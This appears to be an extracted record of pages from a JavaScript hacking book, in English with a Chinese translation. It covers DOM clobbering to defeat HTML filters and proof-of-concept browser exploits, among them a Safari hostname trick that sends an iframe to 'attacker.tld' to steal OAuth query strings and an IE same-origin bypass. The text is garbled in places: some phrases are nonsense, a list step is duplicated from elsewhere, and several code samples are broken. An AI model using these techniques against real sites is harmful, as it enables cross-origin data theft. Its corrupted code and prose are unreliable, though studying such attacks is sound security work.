  - "[PAGE 39]\n\n# Filter exploitation\n\nThere are other ways of exploiting DOM\
    \ clobbering. controlling the value is just one way of exploitation. You can clobber\
    \ the attributes of a DOM node to fool a filter into removing no attributes at\
    \ all. Consider the following example which shows a form element with three attributes,\
    \ the script loops through the attributes to the first and checks if it begins\
    \ with \"on\" if it removes the attributes:\n\n```\n<form id=x onclick=alert(i)\
    \ onmouseover=alert(2)>\n<input>\n</form>\n<script>\nfor(let i=document.getElementById('x').attributes.length-1;i>=0;i--)\
    \ {\n  let attribute=document.getElementById('x').attributes[i];\n  if(/on/i.test(attribute.name))\
    \ {\n    continue;\n  }\n  document.getElementById('x').removeAttribute(attribute.name);\n\
    }\n</script>\n```\n\nThe script removes the attributes by looping through all\
    \ the attributes using the attributes property, unfortunately this property can\
    \ be clobbered by providing a child node with a name of \"attributes\". What happens\
    \ then the script uses the clobbered input as the attributes property and the\
    \ length of element is undefined and therefore the loop will not iterate anything.\
    \ an attacker to sneak their malicious events in and break the filter.\n\nYou\
    \ are not limited to attributes, other DOM properties like tagName/nodeName are\
    \ clobberable, imagine you have a list filter that contains tags such as form.\
    \ You can inject a form with an input element that has a name with tagName or\
    \ nodeName. When a filter accesses it will instead access the clobbered input\
    \ and therefore return the wrong value:\n\n```\n<form id=x>\n<input name=nodeName>\n\
    </form>\n<script>\nalert(document.getElementById('x').nodeName)//object HTMLInputElement\n\
    </script>\n```\n\nEven properties like parentNode are not safe. You canobber the\
    \ last of it just like the others which will return the incorrect parentNode for\
    \ a form element. If you had a DOM based filter that traversed elements using\
    \ DOM properties as parentNode, nextSibling, previousSibling etc. Your filter\
    \ would traverse the wrong elements and filter the incorrect DOM nodes."
  - '[PAGE 40]


    # Chapter four - DOM for hackers


    # Clobbering document.getElementById()


    This is a technique I found recently where you can actually clobber the results
    of a document.getElementById() call. If you have an element with the id of "x"
    and another element with the same id in most circumstances the first element is
    returned by getElementById(). However, I discovered if you use an <html> or <body>
    element you can change the order of the DOM and those elements will merge the
    duplicate tags which causes getElementById() to return the <html> or <body> tag
    depending on which one you use:


    ```

    <div id="x"></div>

    <body id="x">

    <script>

    alert(document.getElementById(''x''))

    </script>

    ```


    This can be exploited when a site is protected by CSP and you have a HTML injection
    that occurs after all the elements you wish to exploit. Using this technique you
    can clober existing nodes and change the results of getElementById() to use your
    element and possibly gain XSS depending on what the site does. This technique
    whilst whistling a well known size and where we learned using a div that was invisible
    in the DOM tree near the body tag and they were using this to control a CDN domain
    that was used in a service worker that they then use an importScript() call inside
    the service worker.


    # Clobbering document.querySelector()


    The same technique can be used to clobber the results of document.querySelector(),
    if a site uses it to find the first element with a class name then the DOM will
    be reordered and the injected <html> or <body> element will be return instead:


    ```

    <div class="x"></div>

    <body class="x">

    <script>

    alert(document.querySelector(''.x''))

    </script>

    ```


    # Summary


    We covered all sorts of interesting things in this chapter. First we found different
    ways of getting the window object from a DOM node. Then we looked at the scoping
    of DOM events and how each event has access to not only the element scope but
    also DOM scope. We finished off with a section on DOM clobbering and explained
    the various attacks and we learned how difficult it is to write a filter that
    traverses the DOM safely.'
- md: "## Chapter five - Browser exploits\n\n## Introduction\n\nWe can't have a book\
    \ on JavaScript hacking without a chapter on browser exploits right? In this chapter\
    \ I'll discuss the various browser exploits I've found over the years. I've been\
    \ hacking browsers (mostly in my spare time) for over 15 years. In that time I've\
    \ managed to find a SOP (same origin policy) bypass or infoleak in every major\
    \ browser.\n\nBrowser hacking is a very niche area of research but it is super\
    \ fun and you will learn a tremendous amount that you can use in other areas.\
    \ This section won't be in chronological order when I found the bug but I'll start\
    \ with the simple bugs and lead up to the more complicated SOP bypasses.\n\n##\
    \ Firefox incorrect handling of cross origin URLs\n\nThis bug was super simple\
    \ and I was surprised that Mozilla's automated tests didn't catch it. I found\
    \ this one when I was testing cross origin windows. I was creating new windows\
    \ and inspecting cross origin objects by looking at the browser console or the\
    \ Hackvertor inspector. The idea was to get a reference to a new window after\
    \ calling \"window.open\" and inspecting that object and see if any data was leaking\
    \ that shouldn't.\n\nWhen you call window.open it return value is the new window\
    \ object, this is different from the normal window object that you used to. A\
    \ lot of properties are unavailable and throw exceptions when you try to read\
    \ them. The reasons for this are clear: if you opened a window to a different\
    \ origin and the window object allowed you to read all the properties then could\
    \ steal data from any website that could result in every account you owned.\n\n\
    The exploit was embarrassingly simple, you opened a new window, waited five seconds\
    \ and attempted to read the location object. Normally an exception would be thrown\
    \ on Firefox they allowed you to read it. When I first found the bug I thought\
    \ it was one of the RegExp methods that the problem but it turned out that you\
    \ could read just the toString() method of the location object:\n\n```javascript\n\
    <script>\nfunction poc() {\n  var win = window.open('https://twitter.com/lists/',\
    \ 'newWin', 'width=200,height=200');\n  setTimeout(function() {\n    alert('Hello\
    \ '+\"https/\\/twitter.com\\*/').exec(win.location[1]);\n  }, 5000);\n}\n</script>\n\
    <input type=button value=\"Firefox\" onclick=\"poc()\">\n```\n\nThe above proof\
    \ of opened a new window to twitter.com/lists/ caused a redirection to a personalised\
    \ URL. The second waited 5 seconds then attempted to redirect the location object\
    \ and used a regex to get the twitter username. Then it would show an alert box\
    \ and identify you.\n\nOriginal write up*\n\n## Safari assignments to cross origin\
    \ hostnames\n\nBack in the day hacking browsers was much easier. Safari bug demonstrates\
    \ this. It involves setting the hostname of a cross origin location object. The\
    \ problem with it is Safari retained the query string and hash since it might\
    \ contain sensitive information. If this bug was found today the most likely target\
    \ would be OAuth tokens. To exploit this bug you had to use a new window or iframe,\
    \ wait for it to set the hostname and then the attacker's domain could read the\
    \ query parameters or hash.\n\n```javascript\n<script>\nfunction poc(iframe) {\n\
    \  var win = iframe.contentWindow;\n  setTimeout(function() {\n    win.location.hostname='attacker.tld';\n\
    \  }, 5000);\n}\n</script>\n<iframe src=\"https://oauth.example.com\" onload=\"\
    poc(this)\"></iframe>\n```\n\nThe above example code loads an iframe that would\
    \ then perform some sort of authentication and store sensitive data in the query\
    \ string. When the page is loaded after redirection on the target site (poc) function\
    \ is called gets a reference to the iframe and then the cross origin window of\
    \ that refers to the object. After five seconds, the attacker sets the hostname\
    \ of the iframe to point to the attacker's domain. The attacker then simply reads\
    \ location.search to steal the secrets.\n\n> *http://www.thespanner.co.uk/2012/10/10/firefox-knows-what-your-friends-did-last-*/\n\
    \n```javascript\n<script>\nvar contents = location.search//contains the query\
    \ string secrets\n</script>\n```\n\nYou can no longer do this in modern browsers;\
    \ they sensibly prevent read/write access to the host hostname properties.\n\n\
    ## Internet Explorer full SOP bypass\n\nI found this bug whilst contracting for\
    \ Microsoft testing various IE features. I love this bug because it's so simple\
    \ yet the impact is great. Using this bug you could execute arbitrary JavaScript\
    \ on any domain. This involves windows and iframes again shock horror. Are you\
    \ sensing a theme here? What happened when IE was leaking a origin constructor.\
    \ What means that the Function constructor was also to be called from a different\
    \ domain.\n\nA good question to ask here how do you know? It's very difficult\
    \ to find for sure you're injecting in a different context because the browser\
    \ doesn't provide an API for that the best you can do is nt accessing a property\
    \ of an object that will tell you what is executing from a different domain. One\
    \ property is document.domain.\n\n```javascript\nfoo.constructor.constructor('alert(document.domain)')();\n\
    ```\n\nUsing the code above if the alert pops up and gives a different domain\
    \ this is a good indication ve found a SOP bypass. However, this is not foolproof\
    \ as you'll find later in the chapter. I found this bug whilst playing with iframes\
    \ and the Hackvector inspector. I simply loaded an iframe and began to test each\
    \ property. I've written a better inspector which makes it easier to demonstrate\
    \ so we'll use that. Here are the steps to test:\n\n- 1. Visit Hackability*\n\
    - 2. Observe that there are some that are enumerable\n- 3. Click each of the\n\
    - 4. The attacker sets the hostname of the iframe to point to the attacker's domain.\
    \ The attacker then simply reads location.search to steal the secrets.\n\n```javascript\n\
    <iframe src=\"garethyes.co.uk\" onload=\"this.contentWindow.constructor('alert(document.domain))\"\
    ></iframe>\n```"
  mdcn: "\n## 第五章 - 浏览器漏洞\n\n## 引言\n\n如果没有关于浏览器漏洞的章节，一本关于 JavaScript 攻击的书是不完整的，对吧？在本章中，我将讨论多年年来发现的各种浏览器漏洞。我破解浏览器（大多在业余时间）已经超过15年了。在此期间，我成功在每个主流浏览器中都发现了\
    \ SOP（同源策略）绕过或信息泄露。\n\n浏览器黑客是一个非常冷门的研究领域，但它超级有趣，你将学到许多可以应用于其他领域的知识。本节不会按照我发现漏洞的时间时间顺序排列，我将从简单的漏洞开始，介绍到复杂的\
    \ SOP 绕过。\n\n## Firefox 对跨源 URL 处理不当\n\n这个漏洞非常简单，我很惊讶 Mozilla 的自动化测试竟然没有检测到它。我在测试跨源窗口时发现了这个漏洞。当时我正在创建新窗口，并通过查看浏览器控制台或\
    \ Hackvertor 检查器来检查跨源对象。思路是在调用 \"window.open\" 后获取新窗口的引用并检查该对象，看看是否有任何不该泄露的数据泄露。\n\
    \n当你调用 `window.open` 时，它的返回值是新窗口对象，这与你以前使用的窗口对象不同。许多属性是不可用的，并且当你尝试读取它们时会抛出异常。原因显而易见：如果你打开另一个源的窗口，而窗口对象允许你读取所有属性，那么就可以从任何网站窃取数据，导致你拥有的每个账户都暴露。\n\
    \n该漏洞简单得令人尴尬：你打开一个新窗口，等待五秒，然后尝试读取 `location` 对象。通常情况下 Firefox 会抛出异常，但它允许你读取它。当我第一次发现这个漏洞时，我以为是某个\
    \ RegExp 方法的问题，但结果证明你只需要读取 `location` 对象的 `toString()` 方法：\n\n```javascript\n\
    <script>\nfunction poc() {\n  var win = window.open('https://twitter.com/lists/',\
    \ 'newWin', 'width=200,height=200');\n  setTimeout(function() {\n    alert('Hello\
    \ '+\"https/\\/twitter.com\\*/').exec(win.location[1]);\n  }, 5000);\n}\n</script>\n\
    <input type=button value=\"Firefox\" onclick=\"poc()\">\n```\n\n上面的证明通过打开到 twitter.com/lists/\
    \ 的新窗口导致重定向到了个性化的 URL。第二个步骤等待5秒，然后尝试重定向 `location` 对象并使用正则表达式获取 twitter 用户名。然后它会显示警告框并识别你的身份。\n\
    \n原始文章*\n\n## Safari 对跨源主机名的赋值\n\n以前，破解浏览器要容易得多。Safari 的漏洞证明了这一点。它涉及设置跨源 location\
    \ 对象的 hostname。该问题在于 Safari 保留了查询字符串和哈希（hash），因为它们可能包含敏感信息。如果这个漏洞在今天被发现，最可能的目标将\
    \ OAuth 令牌。要利用这个漏洞，你需要使用新窗口或 iframe，等待它设置 hostname，然后攻击者的域名就可以读取查询参数或哈希。\n\n```javascript\n\
    <script>\nfunction poc(iframe) {\n  var win = iframe.contentWindow;\n  setTimeout(function()\
    \ {\n    win.location.hostname='attacker.tld';\n  }, 5000);\n}\n</script>\n<iframe\
    \ src=\"https://oauth.example.com\" onload=\"poc(this)\"></iframe>\n```\n\n上面的示例代码加载了一个\
    \ iframe，该 iframe 将执行某种身份验证并将敏感数据存储在查询字符串中。当页面在目标站点重定向后加载时，`poc` 函数被调用，获取 iframe\
    \ 的引用，然后该引用的跨源窗口指向该对象。五秒后，攻击者将 iframe 的 hostname 指向攻击者的域名。攻击者简单地读取 `location.search`\
    \ 来窃取秘密。\n\n> *http://www.thespanner.co.uk/2012/10/10/firefox-knows-what-your-friends-did-last-*/\n\
    \n```javascript\n<script>\nvar contents = location.search//包含查询字符串秘密\n</script>\n\
    ```\n\n你现在无法在现代浏览器中这样做了；它们明智地阻止了对 host hostname 属性的读写访问。\n\n## Internet Explorer\
    \ 完整的 SOP 绕过\n\n我在为微软担任外包测试各种 IE 功能时发现了这个漏洞。我喜欢这个漏洞，因为它非常简单，但影响巨大。使用这个漏洞，你可以在任何域上执行任意\
    \ JavaScript。这再次涉及到窗口和 iframe（令人震惊吧）。你感觉到这里的某种规律了吗？当 IE 泄露源构造函数（origin constructor）时发生了什么？这意味着\
    \ `Function` 构造函数也可以从不同的域调用。\n\n这里有一个很好的问题：你如何知道呢？要确定你正在向另一个上下文中注入是非常困难的，因为浏览器没有提供相应的\
    \ API。你所能做的最好就是访问对象的某个属性，该属性会告诉你是从哪个域执行执行的。其中一个属性是 `document.domain`。\n\n```javascript\n\
    foo.constructor.constructor('alert(document.domain)')();\n```\n\n使用上面的代码，如果弹出警告框并给出一个不同的域，这就是你已经发现\
    \ SOP 绕过的良好迹。然而，这并不是万无一的，正如你在本章的后面会发现的那样。我在玩 iframe 和 Hackvector 检查器时发现这个漏洞的。我只是加载了一个\
    \ iframe 并开始测试每个属性。我写了一个更好的检查器，使得它更容易演示，所以我们将使用它。测试步骤如下：\n\n- 1. 访问 Hackability*\n\
    - 2. 观察到有些是可枚举的（enumerable）\n- 3. 点击每一个\n- 4. 攻击者将 iframe 的 hostname 指向攻击者的域名。攻击者简单地读取\
    \ `location.search` 来窃取秘密。\n\n```javascript\n<iframe src=\"garethyes.co.uk\" onload=\"\
    this.contentWindow.constructor('alert(document.domain))\"></iframe>\n```\n"
